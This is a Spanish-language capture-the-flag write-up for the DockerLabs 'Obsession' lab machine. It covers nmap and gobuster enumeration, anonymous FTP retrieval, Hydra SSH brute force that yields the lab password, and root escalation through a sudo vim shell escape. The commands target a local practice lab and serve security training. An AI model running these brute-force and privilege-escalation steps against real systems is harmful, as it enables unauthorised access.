# Obsession - DockerLabs (Muy Fácil)

**Dificultad:** Muy Fácil  
**Fecha:** 09/2026  
**Sistema:** Linux  
**IP objetivo:** `172.17.0.2`  
**Acceso inicial:** SSH mediante credenciales obtenidas por fuerza bruta

## Herramientas

`arp-scan` `Nmap` `FTP` `Gobuster` `Hydra` `SSH` `Vim`

## Técnicas

`Network Discovery` `Network Enumeration` `FTP Enumeration` `Web Enumeration` `Information Disclosure` `SSH Brute Force` `Credential Discovery` `Sudo Privilege Escalation`

## Introducción

Máquina de [Dockerlabs](https://dockerlabs.es/) centrada en enumeración de rutas web y hacking de protocolos de red (FTP y SSH), con posterior escalada de privilegios por mala configuración de sudo.

- **Dificultad:** Muy Fácil
- **IP objetivo:** 172.17.0.2

## Reconocimiento

### Descubrimiento de host (red Docker)

```
sudo arp-scan -I docker0 --localnet --resolve
```

### Escaneo de puertos

```
nmap -p- -sV -sC --open -sS -vvv -n -Pn --min-rate 5000 172.17.0.2
```

Resultado relevante:

```
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu) - "Russoski Coaching"
```

ftp-anon confirma acceso anónimo permitido, con dos archivos disponibles: chat-gonza.txt y pendientes.txt.

## Enumeración FTP

```
ftp 172.17.0.2
Usuario: anonymous
get chat-gonza.txt
get pendientes.txt
```

**Hallazgos:**
- chat-gonza.txt: conversación que menciona un archivo guardado "en una ruta segura" en el equipo.
- pendientes.txt: menciona explícitamente permisos mal configurados en el sistema, pista directa de escalada de privilegios.

## Enumeración web

```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Rutas encontradas (Status 301):
```
/backup/
/important/
```

**Hallazgos:**
- /backup/backups.txt revela el nombre de usuario del sistema: russoski
- /important/importante.md es el Manifiesto Hacker, sin valor técnico, solo ambientación del lab

## Obtención de credenciales

Con el usuario russoski confirmado, se descartaron contraseñas obvias manualmente y se recurrió a fuerza bruta dirigida:

```
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

Resultado:
```
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
```

## Acceso inicial

```
ssh russoski@172.17.0.2
```
Contraseña: iloveme

## Escalada de privilegios

```
sudo -l
```

Resultado:
```
User russoski may run the following commands on f710d5fef21e:
    (root) NOPASSWD: /usr/bin/vim
```

vim puede ejecutarse como root sin contraseña. Al ser un binario con capacidad de escapar a una shell del sistema, esto permite escalar privilegios directamente:

```
sudo vim
:!/bin/bash
```

El proceso bash hereda los privilegios de root del proceso padre (vim), obteniendo una shell root.

```
whoami
```
Resultado: root

## Conclusión

Máquina con cadena de explotación más completa que Tproot: enumeración FTP y web, recolección de credenciales desde archivos filtrados, fuerza bruta dirigida por SSH y escalada de privilegios vía mala configuración de sudoers. Buen ejercicio para reforzar:
- Lectura de pistas narrativas como vector de reconocimiento
- Uso de gobuster para descubrir contenido oculto
- Fuerza bruta dirigida con hydra una vez confirmado el usuario
- Concepto de herencia de privilegios en procesos hijos, clave en escalada de privilegios
- GTFOBins (gtfobins.github.io) como referencia para explotar binarios con permisos de sudo o SUID mal configurados
